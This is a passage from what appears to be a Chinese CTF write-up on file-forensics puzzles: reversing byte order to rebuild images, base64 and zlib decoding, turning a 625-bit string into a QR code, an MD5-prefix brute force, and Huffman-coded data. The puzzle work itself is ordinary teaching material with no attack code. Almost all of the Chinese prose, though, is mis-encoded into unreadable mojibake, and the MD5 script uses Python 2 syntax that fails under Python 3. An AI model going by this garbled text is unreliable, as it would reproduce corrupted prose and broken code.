E0</code>ï¼Œå€’ç€è¯»æ˜¯jpgçš„æ–‡ä»¶å¤´ï¼Œæ‰¾åˆ°ä¸€ä¸ªè„šæœ¬å°†flag.txtåè½¬ï¼Œç”Ÿæˆoutput.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">import</span> re<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>)<br>out = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>out.close()<br>out = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>)<br><br><span class="hljs-keyword">for</span> fl <span class="hljs-keyword">in</span> f.readlines():<br>    temp=re.findall(<span class="hljs-string">r&#x27;.&#123;2&#125;&#x27;</span>,fl)<br>    order=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> temp:<br>        order.append(i)<br>    order.reverse()   <br>    print(<span class="hljs-string">&#x27;&#x27;</span>.join(order))<br>    out.write(<span class="hljs-string">&#x27;&#x27;</span>.join(order)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>f.close()<br>out.close()<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020122021510034.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å»æ‰ç©ºæ ¼<br><img src="https://img-blog.csdnimg.cn/2020122021510621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å†è´´ä¸Šä¸€ä½å¤§ä½¬çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">re = []<br>s = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag1.txt&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)     <span class="hljs-comment">#ä»¥è¦†ç›–çš„æ–¹å¼è¿›è¡Œå†™æ–‡ä»¶</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag.txt&#x27;</span>);          <span class="hljs-comment">#æ‰“å¼€æ–‡ä»¶,è¿›è¡Œè¯»å–å†…å®¹</span><br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():       <span class="hljs-comment">#è°ƒç”¨readlines()ä¸€æ¬¡è¯»å–æ‰€æœ‰å†…å®¹å¹¶æŒ‰è¡Œè¿”å›list</span><br>    re = line.split(<span class="hljs-string">&#x27; &#x27;</span>)         <span class="hljs-comment">#split()å‡½æ•°ä»¥ç©ºæ ¼ä¸ºåˆ’åˆ†ç”Ÿæˆäº†ä¸€ä¸ªæ–°çš„åˆ—è¡¨å¹¶æ”¾å…¥re[]ä¸­</span><br>    re = re[:-<span class="hljs-number">1</span>]                 <span class="hljs-comment">#å› ä¸ºreadlinesè¿”å›çš„æ¯ä¸€è¡Œæœ€åéƒ½æœ‰/næ¢è¡Œç¬¦ï¼Œæ‰€ä»¥è¦å»æ‰</span><br>    re = re[::-<span class="hljs-number">1</span>]                <span class="hljs-comment">#ä½¿åˆ—è¡¨ä¸­çš„å€¼é€†åº</span><br>    s.write(<span class="hljs-string">&quot; &quot;</span>.join(re) + <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment">#join()å‡½æ•°ç”¨äºåˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºï¼Œç”¨ç©ºæ ¼ç›¸è¿æ¥</span><br><br>s.close()<br></code></pre></td></tr></table></figure><p>å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/20210210182743695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰“å¼€010ï¼Œæ–°å»ºä¸€ä¸ªHex fileï¼ŒæŠŠç¼–è¾‘åçš„output.txtå†…å®¹ç²˜è´´è¿›å»</p><p><img src="https://img-blog.csdnimg.cn/20201220215112849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ–‡ä»¶å¤´æ˜¯FF D8 FF E0ï¼Œæ˜¯jpgæ–‡ä»¶ï¼Œå¦å­˜ä¸ºoutput.jpgï¼Œå¾—åˆ°ä¸€å¼ æ®‹ç¼ºçš„äºŒç»´ç <br><img src="https://img-blog.csdnimg.cn/20201220215120408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>splice.txtå†…å®¹ä¸º<br><img src="https://img-blog.csdnimg.cn/20201220215127795.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>Base64è½¬æ¢ä¸ºå›¾ç‰‡<br><img src="https://img-blog.csdnimg.cn/20201220215133634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¡¥å…¨äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20201220215139387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="23-åå…­è¿›åˆ¶æ–‡ä»¶å¤´å°¾é€†åº"><a href="#23-åå…­è¿›åˆ¶æ–‡ä»¶å¤´å°¾é€†åº" class="headerlink" title="23.åå…­è¿›åˆ¶æ–‡ä»¶å¤´å°¾é€†åº"></a>23.åå…­è¿›åˆ¶æ–‡ä»¶å¤´å°¾é€†åº</h2><p><strong>[HGAME2021]-Hallucigenia</strong></p><p>ç”¨Stegsloveæ‰“å¼€è¿›è¡Œå¼‚æˆ–<img src="https://img-blog.csdnimg.cn/20210215154954283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰«ç ï¼Œæ˜¯â¼†è¿›åˆ¶â½‚ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨è„šæœ¬ç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶flag.bin</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">from base64 import b64decode<br>open(<span class="hljs-string">&#x27;flag.bin&#x27;</span>, <span class="hljs-string">&#x27;wb+&#x27;</span>).write(b64decode(open(<span class="hljs-string">&#x27;flag_inv_b64.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).<span class="hljs-built_in">read</span>()))<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210215160956290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>â½¤ 16 è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€å¯ä»¥å‘ç°æœ‰ PNGã€IHDR ç­‰å­—æ ·ï¼Œæ–‡ä»¶å¤´å°¾é€†åº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>, <span class="hljs-string">&#x27;wb+&#x27;</span>).write(b64decode(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;h.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read())[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>å¾—åˆ°flag.png<br><img src="https://img-blog.csdnimg.cn/20210215160150279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸Šä¸‹ç¿»è½¬é•œåƒï¼Œå¾—åˆ°flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hgame&#123;tenchi_souzou_dezain_bu&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨åå…­è¿›åˆ¶æ–‡ä»¶å¤´å°¾é€†åºè„šæœ¬ï¼Œé¢ å€’åå…­è¿›åˆ¶æ–‡ä»¶flag.binä¹Ÿå¯ä»¥å¾—åˆ°flag.png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">input</span> = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.bin&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>input_all = <span class="hljs-built_in">input</span>.read()<br>ss = input_all[::-<span class="hljs-number">1</span>]<br>output = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>output.write(ss)<br><span class="hljs-built_in">input</span>.close()<br>output.close()<br></code></pre></td></tr></table></figure><h2 id="24-zlibè§£å‹"><a href="#24-zlibè§£å‹" class="headerlink" title="24.zlibè§£å‹"></a>24.zlibè§£å‹</h2><p>ä¾‹é¢˜1ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:\CTF\pngcheck&gt;pngcheck.exe -v pngcheck.png<br>File: pngcheck.png (135570 bytes)<br>  chunk IHDR at offset 0x0000c, length 13<br>    600 x 379 image, 24-bit RGB, non-interlaced<br>  chunk pHYs at offset 0x00025, length 9: 3827x3827 pixels/meter (97 dpi)<br>  chunk tEXt at offset 0x0003a, length 17, keyword: Title<br>  chunk tEXt at offset 0x00057, length 19, keyword: Author<br>  chunk zTXt at offset 0x00076, length 45, keyword: Description<br>  chunk IDAT at offset 0x000af, length 135317<br>    zlib: deflated, 32K window, maximum compression<br>  chunk IDAT at offset 0x21150, length 92:  EOF <span class="hljs-keyword">while</span> reading data<br>ERRORS DETECTED <span class="hljs-keyword">in</span> pngcheck.png<br></code></pre></td></tr></table></figure><p>010 editoræœç´¢IDATï¼Œæ‰¾åˆ°æœ€åé‚£æ®µIDATå—ï¼Œè¯»å–æ•°æ®æ—¶å‘ç”Ÿé”™è¯¯,å¯èƒ½å­˜åœ¨zlibå‹ç¼©<br><img src="https://img-blog.csdnimg.cn/20210507105204619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è„šæœ¬1ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br>s = <span class="hljs-string">&#x27;789C4BCB494CAF4E4B36324D4E4A324FB230B534B54C4B35303637B63032314CB4344B4A33324EA90500E9E20B5FD01C6808&#x27;</span><br>b = <span class="hljs-built_in">bytes</span>.fromhex(s)<br>flag = zlib.decompress(b)<br>print(flag)<br></code></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;fc25cbb7b85959fe03738241a96bf23d&#125;<br></code></pre></td></tr></table></figure><p>ä¾‹é¢˜2ï¼š</p><p>sctf.png<br><img src="https://img-blog.csdnimg.cn/20210507103859362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å…ˆç”¨pngcheckæ£€æŸ¥ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:\CTF\pngcheck-3.0.2-win32&gt;pngcheck.win64.exe -v <span class="hljs-built_in">test</span>/sctf.png<br>File: <span class="hljs-built_in">test</span>/sctf.png (1421461 bytes)<br>  chunk IHDR at offset 0x0000c, length 13<br>    1000 x 562 image, 32-bit RGB+alpha, non-interlaced<br>  chunk sRGB at offset 0x00025, length 1<br>    rendering intent = perceptual<br>  chunk gAMA at offset 0x00032, length 4: 0.45455<br>  chunk pHYs at offset 0x00042, length 9: 3780x3780 pixels/meter (96 dpi)<br>  chunk IDAT at offset 0x00057, length 65445<br>    zlib: deflated, 32K window, fast compression<br>  chunk IDAT at offset 0x10008, length 65524<br>  chunk IDAT at offset 0x20008, length 65524<br>  chunk IDAT at offset 0x30008, length 65524<br>  chunk IDAT at offset 0x40008, length 65524<br>  chunk IDAT at offset 0x50008, length 65524<br>  chunk IDAT at offset 0x60008, length 65524<br>  chunk IDAT at offset 0x70008, length 65524<br>  chunk IDAT at offset 0x80008, length 65524<br>  chunk IDAT at offset 0x90008, length 65524<br>  chunk IDAT at offset 0xa0008, length 65524<br>  chunk IDAT at offset 0xb0008, length 65524<br>  chunk IDAT at offset 0xc0008, length 65524<br>  chunk IDAT at offset 0xd0008, length 65524<br>  chunk IDAT at offset 0xe0008, length 65524<br>  chunk IDAT at offset 0xf0008, length 65524<br>  chunk IDAT at offset 0x100008, length 65524<br>  chunk IDAT at offset 0x110008, length 65524<br>  chunk IDAT at offset 0x120008, length 65524<br>  chunk IDAT at offset 0x130008, length 65524<br>  chunk IDAT at offset 0x140008, length 65524<br>  chunk IDAT at offset 0x150008, length 45027<br>  chunk IDAT at offset 0x15aff7, length 138<br>  chunk IEND at offset 0x15b08d, length 0<br>No errors detected <span class="hljs-keyword">in</span> <span class="hljs-built_in">test</span>/sctf.png (28 chunks, 36.8% compression).<br></code></pre></td></tr></table></figure><p>æ­£å¸¸çš„å—çš„lengthæ˜¯65524ï¼Œè€Œå€’æ•°ç¬¬äºŒä¸ªIDATå—é•¿åº¦æ˜¯45027ï¼Œæœ€åä¸€ä¸ªé•¿åº¦æ˜¯138ï¼Œæœ€åä¸€ä¸ªIDATå—å¼‚å¸¸</p><p>010 editoræ‰¾åˆ°æœ€åä¸€ä¸ªIDATå—çš„åå…­è¿›åˆ¶ï¼Œä½¿ç”¨è„šæœ¬è§£å‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br>s = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">78 9C 5D 91 01 12 80 40 08 02 BF 04 FF FF 5C 75</span><br><span class="hljs-string">29 4B 55 37 73 8A 21 A2 7D 1E 49 CF D1 7D B3 93</span><br><span class="hljs-string">7A 92 E7 E6 03 88 0A 6D 48 51 00 90 1F B0 41 01</span><br><span class="hljs-string">53 35 0D E8 31 12 EA 2D 51 C5 4C E2 E5 85 B1 5A</span><br><span class="hljs-string">2F C7 8E 88 72 F5 1C 6F C1 88 18 82 F9 3D 37 2D</span><br><span class="hljs-string">EF 78 E6 65 B0 C3 6C 52 96 22 A0 A4 55 88 13 88</span><br><span class="hljs-string">33 A1 70 A2 07 1D DC D1 82 19 DB 8C 0D 46 5D 8B</span><br><span class="hljs-string">69 89 71 96 45 ED 9C 11 C3 6A E3 AB DA EF CF C0</span><br><span class="hljs-string">AC F0 23 E7 7C 17 C7 89 76 67 D9 CF A5 A8</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>s = s.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>b = <span class="hljs-built_in">bytes</span>.fromhex(s)<br>flag = zlib.decompress(b)<br>print(flag)<br></code></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;1111111000100001101111111100000101110010110100000110111010100000000010111011011101001000000001011101101110101110110100101110110000010101011011010000011111111010101010101111111000000001011101110000000011010011000001010011101101111010101001000011100000000000101000000001001001101000100111001111011100111100001110111110001100101000110011100001010100011010001111010110000010100010110000011011101100100001110011100100001011111110100000000110101001000111101111111011100001101011011100000100001100110001111010111010001101001111100001011101011000111010011100101110100100111011011000110000010110001101000110001111111011010110111011011&#x27;</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°çš„01 ä¸²çš„é•¿åº¦æ˜¯625ï¼Œ625 = 25*25ï¼Œæ˜¯ä¸ªæ­£æ–¹å½¢çš„å½¢çŠ¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>MAX = <span class="hljs-number">25</span><br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;1111111000100001101111111100000101110010110100000110111010100000000010111011011101001000000001011101101110101110110100101110110000010101011011010000011111111010101010101111111000000001011101110000000011010011000001010011101101111010101001000011100000000000101000000001001001101000100111001111011100111100001110111110001100101000110011100001010100011010001111010110000010100010110000011011101100100001110011100100001011111110100000000110101001000111101111111011100001101011011100000100001100110001111010111010001101001111100001011101011000111010011100101110100100111011011000110000010110001101000110001111111011010110111011011&quot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>            pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:<br>            pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€å¼ äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SCTF&#123;(121.518549,25.040854)&#125;<br></code></pre></td></tr></table></figure><h2 id="25-çˆ†ç ´hash"><a href="#25-çˆ†ç ´hash" class="headerlink" title="25. çˆ†ç ´hash"></a>25. çˆ†ç ´hash</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(s).hexdigest()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">9999999</span>):<br>    <span class="hljs-keyword">if</span> md5(<span class="hljs-built_in">str</span>(i)).startswith(<span class="hljs-string">&#x27;bf5ede&#x27;</span>):<br>        <span class="hljs-built_in">print</span> i<br><span class="hljs-comment">#æ‰¾åˆ°md5å‰6ä½æ˜¯bf5edeçš„å€¼</span><br></code></pre></td></tr></table></figure><h2 id="26-å“ˆå¤«æ›¼ç¼–ç "><a href="#26-å“ˆå¤«æ›¼ç¼–ç " class="headerlink" title="26. å“ˆå¤«æ›¼ç¼–ç "></a>26. å“ˆå¤«æ›¼ç¼–ç </h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">Surprise<br>Wabby Wabby: <br>j 29<br>z 31<br>7 25<br>e 31<br>l 23<br>6 37<br>4 32<br>p 38<br>h 27<br>g 26<br>x 28<br>i 25<br>u 27<br>n 25<br>8 36<br>0 24<br>o 23<br>c 28<br>y 24<br>1 29<br>b 26<br>m 27<br>2 28<br>v 25<br>d 33<br>f 28<br>9 33<br>t 21<br>w 22<br>a 31<br>r 24<br>s 16<br>k 32<br>5 25<br>q 23<br>3 32<br>&#123; 1<br>- 4<br>&#125; 1<br>Wabby Wabbo: <br>0111110001000011001010001111011110101010011011011110100000110010111101000010010010001100001110010000011110011101101111011001111101000000111010100000101101001000111100000000010100110100101001011101110010001100011100010010111001100011100110011010011000101010100011011110001111111110111001011100010100101111100001011011001001001000010111110101110111010111100010111011000011001011001101001010010111111001110101000110001001001100101110111101111000110010010111111000111110000101001100100100001001110100101011111101111110011101011101000000100100100011111111001000101110101001001101110001011101101001001001011010000101111111001011111100110010100111111110001001100100010010010011110111110110110001101000010010110110001011010000100011010111110101110000110000010001111111110000101000100101101111000111100101101011001100010101011000110010011111001010011110100100011000101111110111011011000011011010100011011100010001010001010000000001101001010010100111111010010110110011110100101010010101001010100010101011010011110001000011000100001010111001110001100101100001010111011110110111110000001011011111011101101000111111110100111100110011101111100111100101101101101010100110001100100110101011110000011111111100011110011101010011110101010111100111100001000111110111110100010011110011000010000100001100101111101010110101100011100010010100001110001001010110010010010100010101101101001110000101111110101010110110110000010011000111000010001001101101101101100111000011000011010101111010101100101000011011001011000101101110100011110001100111101111011000100110110000111010101101111101001111111111100001000111000001001011111011110010110101011110001110001101010011000101111100001111111011100110101001000011111101111111011001111110001110111110110010111000111011011110010101010110011001110110011110001111010000011010101000111110111011100101100100100100001111101010011101111100110011100000010100101000111100100011001011111000000111111111000000011111111101110111111001110100100000100000011011111010000000011110101110111101101011001111011010101111000010110001101000111000111000001110110111000100011110101100100100011100111100101101010010110101011111110011100100000111011011010101101110111000001001100110111001000111001000000111000110010110000100100010001001111010101000101101111000000110101110011101001011100110111101101111100001111000110001101010000111100100011110001100110111001101011100010101011110111111111100101100101010001101110101101101010101001110100001101011000100001111011011100101011000001001000011011000111011101110011001101110100000010100000101111010000001000011001101101111010011101000000101101101011101001101110000010011110001110100111000101111101010110111010011010011000011000110110010110001001000101101111000010010001011110100010111010100101100101111010100001110111100000100101101011110010110001000111111001000000101110010111010001101101111101110111000010101100100001010101001010010001011101001100101010101001111110000010011010011110101001001001110010110100111011110110000111101000010011111000111111001111010011101011010011100010001111101001110011110101111111111111011010100000010100010010011110100110011011101011101011101100000100111110111100100000101011000110110000010110001001111111111011101011000010101111110111001011101111111100111011101001000111011110110111101001011110011000110011000010011011001001100010010111110000110100001110111100110110100101010010111001001100101111010010001001111111000010111101010110000001110101000111011010111100110101001001110001110001001111110001000010011011110100111011111000101111110011000011